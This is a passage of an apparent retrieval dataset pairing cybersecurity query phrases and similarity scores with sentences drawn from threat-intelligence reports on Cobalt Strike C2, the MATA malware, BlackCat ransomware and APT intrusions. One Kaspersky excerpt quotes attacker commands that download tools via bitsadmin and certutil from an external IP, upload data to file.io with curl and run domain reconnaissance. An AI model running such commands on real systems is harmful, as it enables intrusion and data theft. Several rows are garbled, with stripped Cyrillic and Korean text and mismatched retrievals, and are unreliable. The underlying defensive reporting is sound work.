our targets environment via the SOCKS server.']
SMB beacons open a local port on the target host and listen for incoming communication from a parent beacon|1.0|['It is worth noting that the default method is the DNS TXT record data channel.', 'Below is the infrastructure that we used for demonstration purposes:Target Host: 192.168.88.179Internal DNS server: 192.168.88.2Cobalt Strike C2 domain:infosecppl.storeWe instructed the Beacon to execute the command systeminfo on the compromised host.', 'As you can see from the screenshot below, it took 148 packets containing DNS requests and responses to finish the task and send back the data to the Cobalt Strike Server.', 'The activity took 5 seconds to complete.As with HTTP/HTTPS traffic, DNS traffic can be randomized using malleable C2 profiles.', 'Some of the options that are available to threat actors are as follows:The above table was taken fromCobalt Strikes official documentationSMB BeaconsAnother option for threat actors is to employ SMB beacons, once they have gained access to the network.', 'SMB beacons open a local port on the target host and listen for incoming communication from a parent beacon.', 'The communication between the two beacons is possible thanks to named pipes.The operators can configure the pipename on the client; however, the default pipename starts with msagent_#for SMB beacons.', 'For a list of default pipe names for other services including some custom profiles check out @svch0sts posthere.SMB beacons are mostly used to make network detection harder and to get access to isolated systems where communication to the internet is prohibited.', 'Additionally, due to SMB protocol being accessible in most internal networks, it makes for a reliable C2 method.', 'Operators can also chain beacons and move laterally inside the network.According to our records, SMB beacons are not frequently used.', 'However, theyre still a powerful weapon in the hands of skilled operators.']
the SMB Beacon is communicating over the network with a parent Beacon using named pipes.|0.9536838737390703|['For a list of default pipe names for other services including some custom profiles check out @svch0sts posthere.SMB beacons are mostly used to make network detection harder and to get access to isolated systems where communication to the internet is prohibited.', 'Additionally, due to SMB protocol being accessible in most internal networks, it makes for a reliable C2 method.', 'Operators can also chain beacons and move laterally inside the network.According to our records, SMB beacons are not frequently used.', 'However, theyre still a powerful weapon in the hands of skilled operators.', 'As we do not see SMB beacons used often in our intrusion cases, we took an example case from our lab to demonstrate the effectiveness of this method.We ran a PowerShell loader on the target host, which loaded a stageless SMB beacon in memory.', 'In our case, the SMB Beacon is communicating over the network with a parent Beacon using named pipes.', 'For this example, we chose the named pipe my_pipes.As you can see from the screenshots below, windows event 4688 contains the execution of the PowerShell command.As explained in ourprevious Cobalt Strikearticle, Sysmon events 17 and 18 can log named pipes.', 'However, Sysmon should be explicitly configured to log named pipes.', 'A good public Sysmon config that includes named pipes and much more isOlafsSysmon Moduler.Below, you can see the named pipe created that we specified on the Cobalt Strike interface when we created the SMB listener.Furthermore, the SMB Beacon will communicate over port 445 to the main beacon as we described above, which will then send the results to the C2 server.', 'This is known as chaining beacons.', 'The below screenshot illustrates the SMB communication between the beacon on the beachhead host and the chained beacon(s).']
a reverse proxy|0.7871514222458236|['While HyperBro was frequently used, the attackers also used the PlugX/Korplug Trojan as a payload at times.', 'Other tools used in recent attacks include: Cobalt Strike: An off-the-shelf tool that can be used to load shellcode onto victim machines.', 'It has legitimate uses as a penetration testing tool but is frequently exploited by malicious actors.', 'LaZagne: A publicly available credential dumping tool.', 'IOX: A publicly available proxy and port-forwarding tool.', 'Fast Reverse Proxy (FRP): A reverse proxy tool.', 'Fscan: A publicly available intranet scanning tool.', 'Conclusion Budworm is known for mounting ambitious attacks against high-value targets.', 'While there were frequent reports of Budworm targeting U.S. organizations six to eight years ago, in more recent years the groups activity appears to have been largely focused on Asia, the Middle East, and Europe.', 'However this is the second time in recent months, Budworm has been linked to attacks against a U.S-based target.', 'A recent CISA report on multiple APT groups attacking a defense sector organization mentioned Budworms toolset.']
Reverse Proxy using Cobalt Strike Beacon|0.7531661616131176|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
Reverse Proxy using Cobalt Strike Beacon|0.7531661616131176|"['cert.gov.ua /article/39708     """"  Cobalt Strike Beacon (CERT-UA#4490) :     CERT-UA    ""!', '! ""', 'XLS- "" .xls"",  .', ',  ,    ""pe.dll"".   \'', 'Cobalt Strike Beacon.', ',  ""pe.dll"", ,  ""spisok.exe""  CERT-UA#4464,  ,   TrickBot.', 'UAC-0098.', ': : 877f834e8788d05b625ba639b9318512 ea9dae45f81fe3527c62ad7b84b03d19629014b1a0e346b6aa933e52b0929d8a  .xls e28ac0f94df75519a60ecc860475e6b3 9990fe0d8aac0b4a6040d5979afd822c2212d9aec2b90e5d10c0b15dee8d61b1 pe.dll (2022-04-15) a3534cc24a76fa81ce38676027de9533 39a868e84524669491d6a251264144f0bfaca4f664d3fd10151854c341077262 shellcode.bin.packed.dll eb18207d505a1de30af6c7baafd28e8e ff30fdd64297ac41937f9a018753871fee0e888844fbcf7bf92bf5f8d6f57090 notevil.dll (CS Beacon) : hxxp://138[.', ']68.229.0/pe.dll hxxps://dezword[.', ']com/apiv8/getStatus 1/3hxxps://dezword[.']"
Reverse Proxy using Cobalt Strike Beacon|0.7531661616131176|"['cert.gov.ua /article/38155     Cobalt Strike Beacon (CERT-UA#4227)     Cobalt Strike Beacon (CERT-UA#4227)      CERT-UA RAR- "".rar"",  RAR- "" 21.03.rar"", ,  , SFX- "" filercs.rar"" (  \'  right-to-left override (RTLO) ).', ',  VBScript- (Thumbs.db),   .NET- ""dhdhk0k34.com"".  \'', 'Cobalt Strike Beacon.', ',   ""inject.exe"" - 15.03.2022 ,  VBScript-,     UAC-0051 (unc1151/GhostWriter).', 'MD5 SHA256  e4b54ee2f0068762179e7e514d90bf16 fbabc4e5a6470606fc64c39c182b5a7a71f8fa96f50c67725d52abf184f75fd4 .rar 4a78df33d4f987103dc0c0f3a302b8cb 59ed536e1955e310f321435d43ca8b60cb3746514f3c3ea951d43633cacbe7bc 21.03.rar bcdab4ae622811f699765bfb9cb909d2 6149680c8541980d46c17681e37e4751e2baca1d13ee648b8188dfb24bf56f7c file rcs.rar b5525108912ee8d5f1519f1b552723e8 d324d7f30984931176ff878a81c7c1f4f979ad3d759c7f33427bba10d9deb1f6 Thumbs.db 3303286735a07ae5d14db9c12843d44e f98e1e61c84a5ed098e7481ab339e2881195f4d1b101c92b81113eb7ff56e63d dhdhk0k34.com 18e73cc3d5eda742530ba3fef59e3943 1/237e644deee0add76bac9c5121355a03a459b1a97917383765bf3df94e9af7e29 Skype.exe b724ff750dff495e6634ddf0f1263844 7cf3f758b2abb303dec89736dfd55c38309a21aec2d83d3d4e590f9538fc5f15 inject.exe (2022-03-15) 1365b82e7da0968e97c095d8bd9166dd c14fce93183dc4173be02b2a48d1ed06b43656c7b6d5a290d9948b6947df9033 csbeacon.bin (Cobalt Strike Beacon) hXXps://ao3.hmgo[.', ']pw/tags/Akihabara@TODEEP/works hXXps://ao3.hmgo[.', ']pw/tags/Akihabara@TODEEP/works/update ao3.hmgo[.', ']pw hmgo[.']"
the ability to run a SOCKS proxy server on the team server.|0.8643264383661365|['This is most likely due to the complex process of setting up the necessary infrastructure.', 'Although, based on the data we have collected regarding malicious infrastructure, domain fronting appears to be used by threat actors.', 'According to our data from early 2021 up to now, Amazon Cloudfront takes the lead on preferable CDN used by threat actors, by a large margin.The data above is available via our services.', 'More information on this service and others can be foundhere.Reverse Proxy using Cobalt Strike BeaconA technique that we come across often is a reverse proxy.', 'We see instances where threat actors use their beacon sessions to establish RDP access through a reverse proxy.', 'Cobalt Strike has the ability to run a SOCKS proxy server on the team server.', 'This enables the operators to setup a listening port and leverage it to relay traffic to and from the open beacon session.', 'The screenshot below demonstrates this implementation.Image credit:cobaltstrike.comSome of the cases we have observed threat actors using reverse proxy are:In most, of the above cases, the aim of the attackers was to establish a Remote Desktop session.', 'There are numerous advantages to establishing a RDP session, including the ability to navigate using a graphical environment and easily move laterally once the necessary access has been granted.Below, we demonstrate how attackers take advantage of this technique usingproxychainsfrom the attackers kali Linux host.', 'In the first image, the attackers open a socks listening port, in this case port 8888, on the Cobalt Strike team server.Creating the listening port (TCP port 8888)In this second image, we employ proxychains from the attackers Kali Linux host to RDP into our targets environment via the SOCKS server.', 'We essentially add the team servers IP address into the proxychains configuration and connect with xfreerdp.RDP into the target host using reverse proxyLooking into the generated artifacts, we can see that a 4624 typ 3 event is created on the target host.']
This enables the operators to setup a listening port and leverage it to relay traffic to and from the open beacon session|1.0000000000000002|['Although, based on the data we have collected regarding malicious infrastructure, domain fronting appears to be used by threat actors.', 'According to our data from early 2021 up to now, Amazon Cloudfront takes the lead on preferable CDN used by threat actors, by a large margin.The data above is available via our services.', 'More information on this service and others can be foundhere.Reverse Proxy using Cobalt Strike BeaconA technique that we come across often is a reverse proxy.', 'We see instances where threat actors use their beacon sessions to establish RDP access through a reverse proxy.', 'Cobalt Strike has the ability to run a SOCKS proxy server on the team server.', 'This enables the operators to setup a listening port and leverage it to relay traffic to and from the open beacon session.', 'The screenshot below demonstrates this implementation.Image credit:cobaltstrike.comSome of the cases we have observed threat actors using reverse proxy are:In most, of the above cases, the aim of the attackers was to establish a Remote Desktop session.', 'There are numerous advantages to establishing a RDP session, including the ability to navigate using a graphical environment and easily move laterally once the necessary access has been granted.Below, we demonstrate how attackers take advantage of this technique usingproxychainsfrom the attackers kali Linux host.', 'In the first image, the attackers open a socks listening port, in this case port 8888, on the Cobalt Strike team server.Creating the listening port (TCP port 8888)In this second image, we employ proxychains from the attackers Kali Linux host to RDP into our targets environment via the SOCKS server.', 'We essentially add the team servers IP address into the proxychains configuration and connect with xfreerdp.RDP into the target host using reverse proxyLooking into the generated artifacts, we can see that a 4624 typ 3 event is created on the target host.', 'One interesting aspect that we have also mentioned in similar cases from our reporting is that the victims hostname is captured in this logon event as well as the source address being 127.0.0.1.Security Event ID 4624 Type 3 shows the attackers hostnameOnce again, the running Cobalt Strike beacon acts as the intermediary to facilitate the Remote Desktop session via reverse proxy.Inside Cobalt Strikes C2 TrafficThis section will attempt to illustrate how the different malleable C2 profiles can affect network communication.In some of the examples below, we simulated the malicious C2 channel to show how different malleable profile configurations can change the observed traffic.']
threat actors use their beacon sessions to establish RDP access through a reverse proxy|0.8788937000023131|['He also published aPythonscript to identify possible domains that can be leveraged for domain fronting.Looking into our reporting, we dont see many instances of domain fronting.', 'This is most likely due to the complex process of setting up the necessary infrastructure.', 'Although, based on the data we have collected regarding malicious infrastructure, domain fronting appears to be used by threat actors.', 'According to our data from early 2021 up to now, Amazon Cloudfront takes the lead on preferable CDN used by threat actors, by a large margin.The data above is available via our services.', 'More information on this service and others can be foundhere.Reverse Proxy using Cobalt Strike BeaconA technique that we come across often is a reverse proxy.', 'We see instances where threat actors use their beacon sessions to establish RDP access through a reverse proxy.', 'Cobalt Strike has the ability to run a SOCKS proxy server on the team server.', 'This enables the operators to setup a listening port and leverage it to relay traffic to and from the open beacon session.', 'The screenshot below demonstrates this implementation.Image credit:cobaltstrike.comSome of the cases we have observed threat actors using reverse proxy are:In most, of the above cases, the aim of the attackers was to establish a Remote Desktop session.', 'There are numerous advantages to establishing a RDP session, including the ability to navigate using a graphical environment and easily move laterally once the necessary access has been granted.Below, we demonstrate how attackers take advantage of this technique usingproxychainsfrom the attackers kali Linux host.', 'In the first image, the attackers open a socks listening port, in this case port 8888, on the Cobalt Strike team server.Creating the listening port (TCP port 8888)In this second image, we employ proxychains from the attackers Kali Linux host to RDP into our targets environment via the SOCKS server.']
it took 148 packets containing DNS requests and responses to finish the task and send back the data to the Cobalt Strike Server.|0.9006027950028974|['This strategy is useful for more covert operations, as the destination host could be a benign DNS server.', 'Defenders will have to inspect the traffic data and look for suspicious DNS records.The screenshot below is from the official Cobalt Strikedocumentation pageand shows how DNS communication works between the compromised host and the C2 server.In the below example, we emulated this technique and configured the Beacon to communicate over DNS and request new tasks using A records.', 'In the same way, we can configure the Beacon to use TXT or AAAA records for requesting tasks or sending information to the server.', 'It is worth noting that the default method is the DNS TXT record data channel.', 'Below is the infrastructure that we used for demonstration purposes:Target Host: 192.168.88.179Internal DNS server: 192.168.88.2Cobalt Strike C2 domain:infosecppl.storeWe instructed the Beacon to execute the command systeminfo on the compromised host.', 'As you can see from the screenshot below, it took 148 packets containing DNS requests and responses to finish the task and send back the data to the Cobalt Strike Server.', 'The activity took 5 seconds to complete.As with HTTP/HTTPS traffic, DNS traffic can be randomized using malleable C2 profiles.', 'Some of the options that are available to threat actors are as follows:The above table was taken fromCobalt Strikes official documentationSMB BeaconsAnother option for threat actors is to employ SMB beacons, once they have gained access to the network.', 'SMB beacons open a local port on the target host and listen for incoming communication from a parent beacon.', 'The communication between the two beacons is possible thanks to named pipes.The operators can configure the pipename on the client; however, the default pipename starts with msagent_#for SMB beacons.', 'For a list of default pipe names for other services including some custom profiles check out @svch0sts posthere.SMB beacons are mostly used to make network detection harder and to get access to isolated systems where communication to the internet is prohibited.']
which will then send the results to the C2 server|0.8318369000310566|['Put the malware into an inactive state for a long time up to 30 days.', 'The time when 17 malware should be awakened is saved in file %TEMP%\\\\ocrcrypto.bak.slp 18 Exit the malware process 19 Force system reboot with the reason Operating System: Upgrade (Planned) 20 Fork the malware process Add this victim to a proxy chain.', 'This command is similar to command 11 and makes a chain of 21 victims forwarding traffic between chain nodes.', 'The difference is the penult node of the chain connects to an arbitrary TCP or UDP service inside victims local network.', 'Plugin#1 Processes commands are as follows: Command Description 0 Run process with redirected stdout and stderr streams.', 'Send results to the C2 server.', '1 Run process 12 2023 AO KASPERSKY LAB2 Run process as user Returns following details about all currently running processes: PID, parent PID 3 command line timing information process owner 4 Kill process 5 Returns the malware and parent process IDs 6 Checks if the process with specified ID is alive 7 Run process 8 Run process as user Plugin#2 Files commands are as follows: Command Description 0 Download part of file from C2 server 1 Upload part of file to C2 server 2 Pack files to zip archive and upload it to C2 server 3 Securely wipe file 4 Does nothing 5 Copies creation, last access and last write timestamps of one file to another 6 Returns the list of files in specified folder or list of logical drive types 7 Write to file detailed list of files in specified folder 8 Pack files to zip archive 9 Returns the list of files in specified folder or list of logical drive types 10 Copy file 11 Copy large file in dedicated thread 12 Delete file 13 2023 AO KASPERSKY LAB13 Concatenate two files into third 14 Split large file to smaller parts 15 Rename file 16 Move large file using dedicated thread 17 Append string to file 18 Upload file to C2 server 19 Upload tail of file (last 32KB) to C2 server 20 Returns total size of all files in the directory 21 Calculate size of directory in dedicated thread and save results into the file 22 Copy directory 23 Copy directory using dedicated thread Plugin#3 NetRecon commands are as follows: Command Description Netstat.', 'Returns list of TCP/UDP listeners and established connections endpoints together 0 with owner process ID 1 Ifconfig.', 'Returns network interfaces configuration 2 Probe TCP connection to specified IP-address:port 3 Probe TCP connections to IP-subnet:port, save results to file 4 Probe TCP connections to IP:ports-range, save results to file 5 ICMP ping specified host 6 ICMP ping all hosts in subnet, save results to file 7 Probe TCP connection to specified host:port and then receive probed server greeting message Probe TCP connection and then receive probed servers greeting message for all hosts in 8 specified subnet, save results to file Probe TCP connection to specified host:ports-range and then receive probed server greeting 9 message, save results to file 10 Connect to remote Windows shared resource (disk or printer) with specified credentials 14 2023 AO KASPERSKY LAB11 Disconnect shared resource 12 Checks if local WMI query is available 13 Set new value of an arbitrary WMI data performing local WMI query 14 Perform remote WMI query with specified credentials to get an arbitrary WMI data 15 Perform remote WMI query with specified credentials to set new value of an arbitrary WMI data 16 Query victim DNS server for A or PTR record Plugin#4 Proxy commands are as follows: Command Description Active-active proxy.', 'The malware TCP connects to two remote hosts (optionally using an 0 external proxy server) and then forwards traffic between them.', 'Active-active C2 proxy.']
which will then send the results to the C2 server|0.7525759603750629|['Displays all information in the current access token, including the current user name, whoami /all security identifiers (SID), privileges, and groups that the current user belongs to.', 'The results of these commands execution are cached and will be returned when C2 requests execution of one of them via command #102.', 'We also found an Easter Egg left by malware authors: when a command containing whoami is received with parameters that are not included in the table above, the hardcoded response is KASPERSKY.', 'Periodically the malware connects to the C2 server using libcurl, performs a handshake, sets up AES session keys and IVs, and receives commands.', 'Command Description 13 Terminates the malware execution 24 Set delay before next C2 server connection Returns to C2 server following information: randomly generated victim and session IDs hardcoded string 1.4.4 - probably the malware version 44 computer name user name OS name (Windows), checks if it Server edition ver Windows command line tool results 69 Download file from C2 server 77 Returns randomly generated session ID 96 Upload file to C2 server Check whoami commands execution results cache from the table above or run the given 102 command with cmd.exe /C.', 'Send execution results to the C2 server.', '8 2023 AO KASPERSKY LAB222 Run the process with a given command line.', 'There is a set of embedded, but not used, strings that lead us to suppose this malware might exist for the following operating systems / platforms: MacOS iPhone Linux BSD Other Apple OS Other Unix OS MataDoor (MATA generation 4) According to our telemetry, the Validator malware fetched a different type of malware we called MataDoor.', 'In a recent publication by Positive Technologies, the third generation of MATA was analyzed and it was named MataDoor.', 'Probably, this collision occurred because Kaspersky Lab products have been detecting samples of the MATA family of both the third and fourth generations as MataDoor since autumn 2022.', 'However, when we say MataDoor, we mean MATA generation 4.']
registry run key persistence implementation|0.7903138429766832|[']online:8443 185[.', ']175.158.27 : 1/2%PUBLIC%\\\\ignit.vbs %PUBLIC%\\\\Favorites\\\\desktop.ini %PUBLIC%\\\\Libraries\\\\core.dll %APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\Windows Prefetch.lNk wscript.exe //B //E:vbs C:\\\\Users\\\\Public\\\\Favorites\\\\desktop.ini C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\regasm.exe /U C:\\\\Users\\\\Public\\\\Libraries\\\\core.dll  MicroBackdoor is a publicly available backdoor program developed using the C ++ programming language.', 'Author: cr4sh (aka Dmytro Oleksiuk).', 'Functional: id, info, ping, exit, upd, uninst, exec, shell, flist, fget, fput, screenshot (implemented separately by members of the group UAC-0051 / unc1151).', 'The server part is designed using the Python programming language and provides a simple web interface for managing bots.', 'Persistence: Run Windows Registry Key.', 'Communication between the bot and the server is encrypted using RC4.', 'Graphic images Fig.', '1 Example of malicious files and image baits 2/2']
The credentials also allow BlackCat to move laterally within the victim’s system and/or network, often with administrative privileges.|0.9545561106071124|['BlackCat execution options.In an effort to maintain longevity, the use of the--access-tokenflag is required to execute the ransomware, which can make it harder to analyze in sandboxed environments.BlackCat ConfigWhile analyzing the ransomware configurations, we observed numerous evasion tactics deployed.', 'These evasion techniques are used in an effort to impair or disable system defenses as well as to stop certain applications that may lock files open on disk, causing problems when trying to encrypt them.', 'BlackCat attempts to kill several processes and services to hinder or prevent security solutions and backups.', 'The process list checked is as follows:agntsvc, dbeng50, dbsnmp, encsvc, excel, firefox, infopath, isqlplussvc, msaccess, mspub, mydesktopqos, mydesktopservice, notepad, ocautoupds, ocomm, ocssd, onenote, oracle, outlook, powerpnt, sqbcoreservice, sql, steam, synctime, tbirdconfig, thebat, thunderbird, visio, winword, wordpad, xfssvccon, *sql*, bedbh, vxmon, benetns, bengien, pvlsvr, beserver, raw_agent_svc, vsnapvss, CagService, QBIDPService, QBDBMgrN, QBCFMonitorService, SAP, TeamViewer_Service, TeamViewer, tv_w32, tv_x64, CVMountd, cvd, cvfwd, CVODS, saphostexec, saposcol, sapstartsrv, avagent, avscc, DellSystemDetect, EnterpriseClient, VeeamNFSSvc, VeeamTransportSvc, VeeamDeploymentSvcThe services running on the compromised system are checked against the following list:mepocs, memtas, veeam, svc$, backup, sql, vss, msexchange, sql$, mysql, mysql$, sophos, MSExchange, MSExchange$, WSBExchange, PDVFSService, BackupExecVSSProvider, BackupExecAgentAccelerator, BackupExecAgentBrowser, BackupExecDiveciMediaService, BackupExecJobEngine, BackupExecManagementService, BackupExecRPCService, GxBlr, GxVss, GxClMgrS, GxCVD, GxCIMgr, GXMMM, GxVssHWProv, GxFWD, SAPService, SAP, SAP$, SAPD$, SAPHostControl, SAPHostExec, QBCFMonitorService, QBDBMgrN, QBIDPService, AcronisAgent, VeeamNFSSvc, VeeamDeploymentService, VeeamTransportSvc, MVArmor, MVarmor64, VSNAPVSS, AcrSch2SvcIn an effort to maintain persistence, the BlackCat ransomware excludes key system and application folders as well as key components from encryption so as not to render the system and ransomware inoperative.', 'The folders excluded are as follows:system volume information, intel, $windows.~ws, application data, $recycle.bin, mozilla, $windows.~bt, public, msocache, windows, default, all users, tor browser, programdata, boot, config.msi, google, perflogs, appdata, windows.oldExcluded file names are as follows:desktop.ini, autorun.inf, ntldr, bootsect.bak, thumbs.db, boot.ini, ntuser.dat, iconcache.db, bootfont.bin, ntuser.ini, ntuser.dat.logAny file with an extension matching the following list will also be avoided:themepack, nls, diagpkg, msi, lnk, exe, cab, scr, bat, drv, rtp, msp, prf, msc, ico, key, ocx, diagcab, diagcfg, pdb, wpx, hlp, icns, rom, dll, msstyles, mod, ps1, ics, hta, bin, cmd, ani, 386, lock, cur, idx, sys, com, deskthemepack, shs, ldf, theme, mpa, nomedia, spl, cpl, adv, icl, msuHardcoded credentials stored within the BlackCat ransomware config lend credence to the likelihood that specific victims are being targeted.', 'The credentials also allow BlackCat to move laterally within the victims system and/or network, often with administrative privileges.', 'Credential access permits the ransomware to deploy additional tools that further propagate the attack.', 'These observations have also been confirmed bySymantec.Associated ToolsBlackCat has been observed using multiple often legitimate tools throughout their attacks, such as Mimikatz, LaZagne and WebBrowserPassView to recover stored passwords, as well as GO Simple Tunnel (GOST) and MEGAsync to exfiltrate data.', 'Additionally, anti-forensics tools like fileshredder, an application to securely delete unwanted files beyond recovery, have also been leveraged during some BlackCat ransomware attacks investigated by Unit 42.Post-compromise ActivitiesOnce candidate systems have been identified for encryption by the threat actors, the ransomware deployment occurs and all viable files will be encrypted.', 'This process often involves renaming files to include another or a different file extension, such aswpzlbji, in the example shown in Figure 4.', 'As is commonplace with other ransomware strains, BlackCat ransomware will drop ransom notes on the compromised system(s) to inform the victim of what has happened and how to go about getting their data restored.']
such as Mimikatz|0.7989984894764406|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
Using cmd.exe,|0.8789671605534077|"['The following is a knowledge base of SQL queries, based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK) adversary model, developed by MITRE.', 'These SQL queries are based on MITREs recommended analytics, and are meant to further assist the SOC analyst in their threat hunt for a potential breach on their network.15 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe called from Command Shell Tactic: TTP MITRE Reference: CAR-2013-03-001: Reg.exe called from Command Shell Hypothesis: Registry modifications are often essential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphically via select source.name, data.process.cmd, count(*) AS regedit.exe or by using the corresponding channels, or even hostcount from network-events where type = 'sysmon' calling the Registry APIs directly."", ""The built-in utility reg.exe AND data.process.action = 'launch' AND data.process."", ""provides a command-line interface to the registry, so that image.file = 'reg.exe' AND data.process.parentImage.file = queries and modifications can be performed from a shell, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe.', ""Occasionally, (data.process.cmd LIKE '%add%' OR data.process.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.process.cmd LIKE '%copy%' OR data."", 'behavior as well, but likely from a different process tree.', ""process.cmd LIKE '%restore%' OR data.process.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.process.cmd LIKE '%import%') order by tuned out accordingly."", 'hostcount DESC16 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
Using cmd.exe,|0.781086742700734|"['These files provide sequential execution of commands using algorithmic structures such as conditional operators and loops.', 'Seeing as how cmd.exe is employed by attackers in a large number of cases and overlaps with other techniques of the MITRE ATT&CK matrix, here we will examine only a few examples of cmd.exe use at different stages of an attack without delving too deep into the details of each example.', 'We give a detailed breakdown of the mentioned procedures in their corresponding techniques.', 'Examples of procedures Example 1 Lateral Tool Transfer via SMB.', 'Attackers use the copy command to copy the contents of the current folder to a remote host (the copied files contain the tools and malware that the attacker needs): $system32\\\\cmd.exe /C copy * \\\\\\\\<remote_ip>\\\\C$\\\\windows\\\\help\\\\help Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 90 Example 2 After gaining access to the system, the attackers conduct reconnaissance.', 'Similar to the procedures in the described incidents, the operator executes reconnaissance commands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\\\\\\\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Attackers use cmd.exe to run their malware: cmd /c $system32\\\\conhost64.exe Example 4 Attackers use cmd.exe to download the tools that they will use in subsequent stages of an attack to the compromised system: cmd.exe /c bitsadmin /transfer n hxxp://8.210.141[.', ']104:8099/1.txt $public\\\\Downloads\\\\1.txt cmd.exe /c certutil -urlcache -split -f hxxp://8.210.141[.', ']104:8099/MEUpdate.exe $windir\\\\Help\\\\Help\\\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 91 Example 5 Operators exfiltrate the collected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\\\1.rar"" --ssl-no-revoke https://file.io Example 6 Attackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 92 The script gathers data on the system and saves this data to files, then adds them to an archive.', 'Here are all the reconnaissance commands employed in the script: ver >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb time /t >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb date /t >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb hostname >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb systeminfo >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net localgroup Administrators >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb ipconfig /all >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tasklist /v >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tasklist -svc >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net start >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb ping www.yandex.ru >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tracert -h 5 www.yandex.ru >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb netstat -aon >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb netstat -bv >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net use >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net share >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net view >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net view /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net user >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net user /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain controllers"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain admins"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain computers"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb nltest /domain_trusts >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb route print >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb arp -a >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb dir /a ""c:\\\\program files\\\\*.', '*"" >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb dir /a ""c:\\\\Program Files (x86)\\\\*.']"
Using cmd.exe,|0.8789671605534077|"[', ,     APT28.', ', ,       - .', ', -    .', ',      .', ': OCEANMAP - ,   C#.', 'cmd.exe.', 'IMAP.', ', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  .""]"
Using cmd.exe,|0.8789671605534077|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
